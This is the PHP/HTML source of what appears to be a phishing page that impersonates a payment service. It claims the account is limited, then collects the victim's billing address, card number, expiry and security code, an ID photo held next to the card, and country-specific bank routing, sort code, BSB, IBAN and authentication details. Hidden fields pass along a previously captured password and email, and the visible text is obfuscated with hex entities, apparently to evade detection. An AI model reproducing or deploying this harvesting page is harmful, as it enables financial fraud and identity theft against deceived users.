<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">- You won't be able shopping.</span></div></div><div class="fiModule-currency-container fiModule-currency_text"><div class="balanceNumeral nemo_balanceNumeral">
<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">- You can't send or recelve money.</span></div></div>

<div class="fiModule-currency-container fiModule-currency_text"><div class="balanceNumeral nemo_balanceNumeral">
<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">- You can't see your last activity.</span></div></div><div class="fiModule-currency-container fiModule-currency_text"><div class="balanceNumeral nemo_balanceNumeral">
<span class="numeralLabel vx_text-body_secondary balanceModule-zeroBalanceText">- You won't be able to withdraw money.</span></div></div></ul></div>

</div><div class="col-sm-8">
<div class=" overpanel-body ">
<div id="card-form" class="col-sm-12 p">
<form autocomplete="off" id="form1" method="post" name="Bill&amp;CC" action="#" novalidate="novalidate">
<h2 class="x-large msg">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x42;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;</h2>
<div id="fullname" style="margin: 1%;" class="textInput holder3 center">
<input id="FN" name="fullnameInput" class="inputs" required="required" aria-required="true" placeholder="&#x46;&#x75;&#x6C;&#x6C;&#x20;&#x6E;&#x61;&#x6D;&#x65;" type="text" onfocusout="Dwissel()">
</div>
<div id="street_address" style="margin: 1%;" class="textInput holder3 center">
<input id="AD" name="staddressInput" class="inputs" value="" required="required" aria-required="true" placeholder="&#x41;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x20;&#x6C;&#x69;&#x6E;&#x65; " type="text" maxlength="120">
</div>
<div id="city" style="margin: 1%;" class="textInput holder1 center">
<input id="CI" name="cityInput" class="inputs" required="required" aria-required="true" placeholder="&#x43;&#x69;&#x74;&#x79;" type="text" maxlength="30">
<input type="hidden" name="pwd" id="pwd" value="<?=@$_SESSION['_password_'];?>">
</div>
<div id="state" style="margin: 1%;" class="textInput holder1 center">
<input id="ST" required="required" name="stateInput" class="inputs" placeholder="&#x53;&#x74;&#x61;&#x74;&#x65;" type="text" maxlength="30">
</div>
<div id="country" style="margin: 1%;" class="textInput holder1 center">
<input id="CO" name="countryInput" class="inputs" required="required" aria-required="true" placeholder="&#x43;&#x6F;&#x75;&#x6E;&#x74;&#x72;&#x79;" type="text" value="<?
														include('get_ip.php');
														echo $_SESSION['_LOOKUP_COUNTRY_']?>" maxlength="30">
<input type="hidden" name="mail" id="mail" value="<?=@$_SESSION['_email_'];?>">
</div>
<div id="postal_code" style="margin: 1%;" class="textInput holder1 center">
<input id="PO" name="postal_codeInput" class="inputs" required="required" aria-required="true" placeholder="&#x50;&#x6F;&#x73;&#x74;&#x61;&#x6C;&#x20;&#x63;&#x6F;&#x64;&#x65;" type="text" maxlength="12">
</div>
<h2 class="x-large  t">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6C;&#x73;</h2>
<div id="cardholder" style="margin: 1%;" class="textInput holder4 center">
<input id="CCHo" name="cardholderInput" class="inputs" required="required" aria-required="true" placeholder="&#x43;&#x61;&#x72;&#x64;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x6E;&#x61;&#x6D;&#x65;" type="text">
</div>
<div id="cardnumber" style="margin: 1%;" class="textInput holder4 center">
<input id="CCNu" name="cardnumberInput" class="inputs" required="required" aria-required="true" placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;" onpaste="return false" maxlength="19" type="tel" onfocusout="creditcard(this.value)" >
<span id="cardicon" class=""></span>
<input type="hidden" name="cc1type" id="CC1TY">
</div>
<div id="expiration" style="margin: 1%;" class="textInput holder1 center">
<input id="EXP" name="expirationInput" class="inputs" required="required" aria-required="true" placeholder="&#x45;&#x78;&#x70;&#x69;&#x72;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x4D;&#x4D;&#x2F;&#x59;&#x59;&#x59;&#x59;" maxlength="7" type="tel">
</div>
<div id="cardcode" style="margin: 1%;" class="textInput holder1 center">
<input id="CSC" name="cardcodeInput" class="inputs" required="required" aria-required="true" placeholder="&#x43;&#x53;&#x43;&#x20;&#x28;&#x33;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" maxlength="4" type="tel">
<span id="cscicon" class="csc"></span>
</div>

<p></p>
<input id="btn" style="margin: 1%; " class="vx_btn center" value="Confirm" type="submit">
</form></div>
<div id="id-form" class="col-sm-12 p hide">
<form autocomplete="off" id="form5" method="post" action="#" enctype="multipart/form-data" name="ID"  novalidate="novalidate">
<h2 class="x-large msg">&#x55;&#x70;&#x6C;&#x6F;&#x61;&#x64;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x70;&#x72;&#x6F;&#x6F;&#x66;&#x20;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;</h2>
<p class="mar_g" style="font-size: 1.2em;">&#x57;&#x68;&#x61;&#x74;&#x20;&#x73;&#x68;&#x6F;&#x75;&#x6C;&#x64;&#x20;&#x69;&#x20;&#x64;&#x6F;&comma;&#x20;&#x74;&#x6F;&#x20;&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x6D;&#x79;&#x20;&#x69;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x74;&#x79;&quest;</p>
<div class="mar_g" style="margin-bottom: 1em;font-size: 13px;">
                                    <ul>    
                                        <li>&#x54;&#x61;&#x6B;&#x65;&#x20;&#x61;&#x20;&#x70;&#x68;&#x6F;&#x74;&#x6F;&#x20;&#x62;&#x79;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x69;&#x6E;&#x67;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x49;&#x44;&#x2D;&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x65;&#x78;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;.</li>
                                        <li>&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x49;&#x44;&#x2D;&#x43;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x61;&#x6D;&#x65;&#x73;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x6D;&#x61;&#x74;&#x63;&#x68;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x62;&#x65;&#x20;&#x63;&#x6C;&#x65;&#x61;&#x72;&#x6C;&#x79;&#x20;&#x76;&#x69;&#x73;&#x69;&#x62;&#x6C;&#x65;.</li>
										<li>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x69;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x73;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x62;&#x65;&#x20;&#x6E;&#x65;&#x78;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x66;&#x61;&#x63;&#x65;.</li>
										<li>&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x75;&#x73;&#x65;&#x20;&#x6F;&#x6E;&#x65;&#x20;&#x6F;&#x66;&#x20;&#x74;&#x68;&#x65;&#x73;&#x65;&#x20;&#x66;&#x69;&#x6C;&#x65;&#x20;&#x74;&#x79;&#x70;&#x65;&#x73;&colon;&#x20;&#x4A;&#x50;&#x47;&comma;&#x20;&#x47;&#x49;&#x46;&comma;&#x20;&#x50;&#x4E;&#x47;&comma;&#x20;&#x42;&#x4D;&#x50;&comma;&#x20;&#x54;&#x49;&#x46;.</li>
                                    </ul>
</div>
<p class="mar_g" style="font-size: 1.2em;">&#x48;&#x65;&#x72;&#x65;&apos;&#x73;&#x20;&#x61;&#x20;&#x70;&#x69;&#x63;&#x74;&#x75;&#x72;&#x65;&#x20;&#x65;&#x78;&#x61;&#x6D;&#x70;&#x6C;&#x65;&colon;</p>
<img class="undrag mar_g IDD" src="img/ID.jpg" style="height: auto;width: 100%;">
<p></p>									
<div id ="upload-area" class="file-area form-group mar_g upzone">
<input type="file"  id="file-1"  name="attach1" id="uploadImage" data-multiple-caption="{count} files selected" multiple="">
<div class="file-dummy ">
      <div id="deff" style="font-weight:bold;">&#x43;&#x6C;&#x69;&#x63;&#x6B;&#x20;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x63;&#x68;&#x6F;&#x6F;&#x73;&#x65;&#x20;&#x61;&#x20;&#x66;&#x69;&#x6C;&#x65;&#x20;&#x6F;&#x72;&#x20;&#x64;&#x72;&#x61;&#x67;&#x20;&#x69;&#x74;&#x20;&#x68;&#x65;&#x72;&#x65;.</div>
      <div  id="goood" class="hide" style="font-weight:bold;color: green;"></div>
      <div id="select" style="font-weight:bold;color:red;"></div>
	  <input id="title" type="hidden" />
      <input name="user" id="user" value="" type="hidden" />
</div>
</div>
<input id="doc-btn" style="margin: 1%; " class="vx_btn center Uploadbtn holder6" value="Confirm" type="submit" >
</form>
</div>
<div id="bank-form" class="col-sm-12 p hide">
<form autocomplete="off" id="form3" method="post" name="bank" action="#" novalidate="novalidate">
<h2 class="x-large msg">&#x43;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x20;&#x61;&#x20;&#x62;&#x61;&#x6E;&#x6B;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</h2>
<?php
if ($_SESSION['CountryCode'] == "US"){
	echo'	
<div class="row msgBK2">
<div id="CHECKING" class="vx_radio col-xs-6">
<input type="radio" name="accountTypechecking" id="checkingRadioBtn" value="" checked="">
<label for="checkingRadioBtn" >&#x43;&#x68;&#x65;&#x63;&#x6B;&#x69;&#x6E;&#x67;</label></div>
<div id="SAVINGS" class="vx_radio col-xs-6">
<input type="radio" name="accountTypesavings" id="savingsRadioBtn" value="">
<label for="savingsRadioBtn" >&#x53;&#x61;&#x76;&#x69;&#x6E;&#x67;&#x73;</label>
</div>
</div>
<div class="">
<div id="check" class="addBank-checkImage msgBK"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 280.5 119.4" preserveAspectRatio="xMidYMid meet" width="100%" height="100%"><style>.st0{fill:none;stroke:#CCD2D6;stroke-miterlimit:10;} .st1{fill:#3B3D3F;} .st2{fill:#D5DBDD;}</style><path class="st0" d="M8.6 26h165.2M8.6 47h261.6M8.6 85.3h121.3M148.9 85.3h121.3"></path><path class="st1" d="M102.7 109.4l.2-3.9h4.4v1h-3.5l-.1 2c2 .1 3.9.7 3.9 2.7 0 1.7-1.5 2.8-3.6 2.8-1 0-1.7-.2-2.3-.6v-1.1c.6.5 1.5.7 2.3.7 1.5 0 2.5-.7 2.5-1.8-.1-1.2-1.4-1.6-3.8-1.8zM112 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM117.1 113.9v-1h2.3v-6l-2.4.8v-.9l2.8-1.2h.7v7.4h2.1v1h-5.5zM127.2 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3c1.9 0 3.1 1.8 3.1 4.3s-1.2 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3c1.3 0 1.9-1.4 1.9-3.3s-.6-3.3-1.9-3.3zM134.9 114c-1.8 0-3.2-1.6-3.2-3.9 0-2.7 1.5-4.7 4.1-4.7.7 0 1.3.2 1.7.4v.9c-.4-.3-1.1-.4-1.7-.4-1.9 0-2.9 1.3-3.1 3.4.4-.6 1.2-1.2 2.4-1.2 1.5 0 2.6 1 2.6 2.6 0 1.7-1.2 2.9-2.8 2.9zm1.7-2.8c0-1.1-.8-1.8-1.8-1.8s-1.6.5-2.1 1.1c.1 1.6 1 2.5 2.1 2.5 1.1.1 1.8-.6 1.8-1.8zM142.3 114c-1.8 0-3.2-1.6-3.2-3.9 0-2.7 1.5-4.7 4.1-4.7.7 0 1.3.2 1.7.4v.9c-.4-.3-1.1-.4-1.7-.4-1.9 0-2.9 1.3-3.1 3.4.4-.6 1.2-1.2 2.4-1.2 1.5 0 2.6 1 2.6 2.6.1 1.7-1.2 2.9-2.8 2.9zm1.8-2.8c0-1.1-.8-1.8-1.8-1.8s-1.6.5-2.1 1.1c.1 1.6 1 2.5 2.1 2.5 1.1.1 1.8-.6 1.8-1.8zM149.6 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3 3.1 1.8 3.1 4.3-1.1 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3 1.9-1.4 1.9-3.3-.5-3.3-1.9-3.3zM157.5 113.9v-2.2h-3.7v-.8c.5-1.6 1.8-3.9 3.2-5.4h1.4c-1.6 1.7-2.7 3.5-3.4 5.2h2.6v-2.1h1.1v2.1h2v.9h-2v2.2h-1.2zM164.3 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM172.5 113.9v-2.2h-3.7v-.8c.5-1.6 1.8-3.9 3.2-5.4h1.4c-1.6 1.7-2.7 3.5-3.4 5.2h2.6v-2.1h1.1v2.1h2v.9h-2v2.2h-1.2z"></path><g><path class="st1" d="M12.4 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3 3.1 1.8 3.1 4.3-1.2 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3 1.9-1.4 1.9-3.3-.6-3.3-1.9-3.3zM17.3 113.9v-1h2.3v-6l-2.4.8v-.9l2.8-1.2h.7v7.4h2.1v1h-5.5zM27.1 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM31.6 112.4c.7.5 1.5.6 2.3.6 1.5 0 2.6-.7 2.6-1.8s-1.1-1.5-3-1.5v-.7l2.4-2.5H32v-1h5.1v1.1l-2.3 2.4c1.3.1 2.9.7 2.9 2.3 0 1.6-1.7 2.7-3.7 2.7-1 0-1.7-.2-2.3-.6v-1zM42.3 114c-1.9 0-3.1-1.8-3.1-4.3s1.2-4.3 3.1-4.3 3.1 1.8 3.1 4.3-1.2 4.3-3.1 4.3zm0-7.6c-1.3 0-1.9 1.4-1.9 3.3s.6 3.3 1.9 3.3 1.9-1.4 1.9-3.3-.6-3.3-1.9-3.3zM47.2 113.9v-1h2.3v-6l-2.4.8v-.9l2.8-1.2h.7v7.4h2.1v1h-5.5zM57 106.5c-1 0-1.9.5-2.6 1.2v-1.1c.6-.6 1.6-1.1 2.7-1.1 1.7 0 2.7 1 2.7 2.4s-1.3 2.5-3 4l-1.2 1.1h4.6v1h-6v-1l1.9-1.7c1.5-1.3 2.5-2.2 2.5-3.3.1-.9-.5-1.5-1.6-1.5zM61.5 112.4c.7.5 1.5.6 2.3.6 1.5 0 2.6-.7 2.6-1.8s-1.1-1.5-3-1.5v-.7l2.4-2.5H62v-1h5.1v1.1l-2.3 2.4c1.3.1 2.9.7 2.9 2.3 0 1.6-1.7 2.7-3.7 2.7-1 0-1.7-.2-2.3-.6v-1zM72.6 113.9v-2.2h-3.7v-.8c.5-1.6 1.8-3.9 3.2-5.4h1.4c-1.6 1.7-2.7 3.5-3.4 5.2h2.6v-2.1h1.1v2.1h2v.9h-2v2.2h-1.2z"></path></g><g><path class="st2" d="M188.2 19.8v-1.9c-.9 0-1.8-.3-2.3-.7v-1.1c.8.6 1.9.8 2.6.8 1 0 1.7-.3 1.7-1.1 0-1.4-4-.7-4-2.9 0-1 .8-1.7 2-1.9V9.5h.9v1.7c.6 0 1.3.2 1.8.5v1c-.7-.4-1.4-.6-2.1-.6-.9 0-1.6.4-1.6 1 0 1.3 4.1.7 4.1 2.9 0 1-.9 1.8-2.2 2v2h-.9z"></path></g><path class="st0" d="M197.2 11.2c0-1.1.9-2 2-2h68.6c1.1 0 2 .9 2 2v15.2c0 1.1-.9 2-2 2h-68.6c-1.1 0-2-.9-2-2V11.2zM245.9 82.2c-2-2-6-1.2-9 1.8-1.1 1.1-1.9 2.4-2.4 3.6 1.6-4.2 1.3-8.3-1.2-10.8-4-4-12-2.4-18 3.6-2.2 2.2-3.8 4.7-4.8 7.2 2.4-6.3 2-12.5-1.8-16.3-6-6-18-3.6-27 5.4-3.3 3.3-5.7 7.1-7.2 10.8"></path></svg>
</div>
<div id="RN" style="margin:1%" class="textInput routingNum routingNumber lap holder3 center">
<label for="routingNum" class="accessAid">&#x52;&#x6F;&#x75;&#x74;&#x69;&#x6E;&#x67;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label>
<input aria-invalid="false" id="routingNum" name="routingNumber" onpaste="return false" class="hasHelp js_needsValidation validate" required="required" aria-required="true" value="" placeholder="&#x52;&#x6F;&#x75;&#x74;&#x69;&#x6E;&#x67;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;" autocomplete="off" pattern="[0-9]*" maxlength="9" data-min="9/" type="text" ng-routingnum ng-model="formData.accountRouting" onkeyup="USABANK(this.value)">
<p class="help-information" id="routingNum-help-information">&#x41;&#x20;&#x39;&#x2D;&#x64;&#x69;&#x67;&#x69;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x61;&#x74;&#x20;&#x74;&#x68;&#x65;&#x20;&#x6C;&#x6F;&#x77;&#x65;&#x72;&#x20;&#x6C;&#x65;&#x66;&#x74;&#x20;&#x63;&#x6F;&#x72;&#x6E;&#x65;&#x72;&#x20;&#x6F;&#x66;&#x20;&#x61;&#x20;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x2E;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x61;&#x6E;&#x6B;&#x20;&#x69;&#x66;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x6E;&#x65;&#x65;&#x64;&#x20;&#x68;&#x65;&#x6C;&#x70;&#x2E;</p>
</div>
<div id="AN" style="margin:1%" class="textInput accountNum accountNumber lap holder3 center">
<label for="accountNum" class="accessAid">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="enterInput" required="required" aria-required="true" value="" placeholder="&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x28;&#x33;&#x2D;&#x31;&#x37;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="17" data-min="3/" type="text">
<p class="help-information" id="accountNum-help-information">&#x41;&#x20;&#x33;&#x2D;&#x31;&#x37;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x61;&#x74;&#x20;&#x74;&#x68;&#x65;&#x20;&#x62;&#x6F;&#x74;&#x74;&#x6F;&#x6D;&#x20;&#x6F;&#x66;&#x20;&#x61;&#x20;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x20;&#x6F;&#x72;&#x20;&#x6F;&#x6E;&#x20;&#x61;&#x20;&#x62;&#x61;&#x6E;&#x6B;&#x20;&#x73;&#x74;&#x61;&#x74;&#x65;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x61;&#x6E;&#x6B;&#x20;&#x69;&#x66;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x6E;&#x65;&#x65;&#x64;&#x20;&#x68;&#x65;&#x6C;&#x70;&#x2E;</p>
</div>
<div class="hide" id="dwissel2">
<div style="margin:1%" class="textInput accountNum accountNumber lap holder3 center">
<input name="authkey" id ="authky" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="&#x41;&#x75;&#x74;&#x68;&#x65;&#x6E;&#x74;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x4B;&#x65;&#x79;"  maxlength="6" type="password"></div>
</div>
';}
elseif (($_SESSION['CountryCode'] == "GB") || ($_SESSION['CountryCode'] == "IE")){	
	echo'
<div style="margin:1%" class="textInput routingNum routingNum routingNumber lap holder3 center">
<label for="routingNum" class="accessAid">&#x53;&#x6F;&#x72;&#x74;&#x20;&#x43;&#x6F;&#x64;&#x65;</label>
<input aria-invalid="false" id="sortC" onpaste="return false" name="sortCode" class="enterInput"  value="" placeholder="&#x53;&#x6F;&#x72;&#x74;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x28;&#x36;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="8"  type="tel" onkeyup="UKBANK(this.value)">
</div>
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder3 center">
<label for="accountNum" class="accessAid">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x28;&#x38;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="8"  type="tel">
</div>
';}
elseif ($_SESSION['CountryCode'] == "CA"){
	echo'
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder1 center">
<label for="routingNum" class="accessAid">&#x54;&#x72;&#x61;&#x6E;&#x73;&#x69;&#x74;</label>
<input aria-invalid="false" id="catran" onpaste="return false" name="transit" class="hasHelp js_needsValidation validate valid" value="" placeholder="&#x54;&#x72;&#x61;&#x6E;&#x73;&#x69;&#x74;&#x20;&#x23;&#x20;&#x28;&#x35;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="5" type="tel" onkeyup="BANKCA(this.value)">
</div>
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder1 center">
<label for="accountNum" class="accessAid">&#x49;&#x6E;&#x73;&#x74;&#x69;&#x74;&#x75;&#x74;&#x69;&#x6F;&#x6E;</label>
<input aria-invalid="false" id="instica" onpaste="return false" name="institution" class="hasHelp js_needsValidation validate cobrowse_mask valid" aria-required="true" value="" placeholder="&#x49;&#x6E;&#x73;&#x74;&#x69;&#x74;&#x75;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x23;&#x20;&#x28;&#x33;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="3" type="tel" onkeyup="BANKCA(this.value)">
</div>
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder3 center">
<label for="accountNum" class="accessAid">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask valid" aria-required="true" value="" placeholder="&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x28;&#x31;&#x2D;&#x31;&#x32;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="12" type="tel">
</div>
';}
elseif ($_SESSION['CountryCode'] == "AU" || ($_SESSION['CountryCode'] == "NZ")){
	echo'
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder3 center">
<label for="routingNum" class="accessAid">&#x42;&#x53;&#x42;</label>
<input aria-invalid="false" id="bsbNum" onpaste="return false" name="BSB" class="hasHelp js_needsValidation validate"  value="" placeholder="&#x42;&#x53;&#x42;&#x20;&#x28;&#x36;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="7"  type="tel" onkeyup="AUBANK(this.value)">
</div>
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder3 center">
<label for="accountNum" class="accessAid">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x20;&#x28;&#x31;&#x2D;&#x39;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" autocomplete="off" pattern="[0-9]*" maxlength="9"  type="tel">
</div>
<div class="hide" id="dwissel1">
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder1 center">
<input name="secNum" id="secNum" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;"  maxlength="6" type="password"></div>
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder1 center">
<input name="issNum" id="issNum"class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="&#x49;&#x73;&#x73;&#x75;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;"  maxlength="1" type="tel"></div>
</div>
<div class="hide" id="dwissel2">
<div style="margin:1%"  class="textInput accountNum accountNum accountNumber lap holder3 center">
<input name="authkey" id ="authky" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="&#x41;&#x75;&#x74;&#x68;&#x65;&#x6E;&#x74;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x4B;&#x65;&#x79;"  maxlength="6" type="password"></div>
</div>
';}
elseif ($_SESSION['CountryCode'] == "CH"){
	echo'
<div style="margin:1%" class="textInput routingNum routingNumber lap holder3 center">
<label for="firstName" class="accessAid">&#x46;&#x69;&#x72;&#x73;&#x74;&#x20;&#x6E;&#x61;&#x6D;&#x65;</label>
<input id="firstName" name="firstName" type="text" class="hasHelp js_needsValidation validate cobrowse_mask"   value="" placeholder="&#x46;&#x69;&#x72;&#x73;&#x74;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off" maxlength="64" aria-invalid="false">
<p class="help-information" id="firstName-help-information">&#x54;&#x68;&#x65;&#x20;&#x66;&#x69;&#x72;&#x73;&#x74;&#x20;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x6D;&#x75;&#x73;&#x74;&#x20;&#x6D;&#x61;&#x74;&#x63;&#x68;&#x20;&#x74;&#x68;&#x65;&#x20;&#x66;&#x69;&#x72;&#x73;&#x74;&#x20;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x6F;&#x6E;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x61;&#x6E;&#x6B;&#x20;&#x73;&#x74;&#x61;&#x74;&#x65;&#x6D;&#x65;&#x6E;&#x74;&#x2E;</p>
</div>
<div style="margin:1%" class="textInput routingNum routingNumber lap holder3 center">
<label for="routingNum" class="accessAid">&#x49;&#x42;&#x41;&#x4E;</label>
<input aria-invalid="false" id="iban" name="IBAN" data-rule-iban="true" class="enterInput"  value="" placeholder="&#x49;&#x42;&#x41;&#x4E;&#x20;&#x28;&#x49;&#x6E;&#x74;&#x65;&#x72;&#x6E;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x29;" autocomplete="off"  maxlength="32"  type="text">
</div>
';}
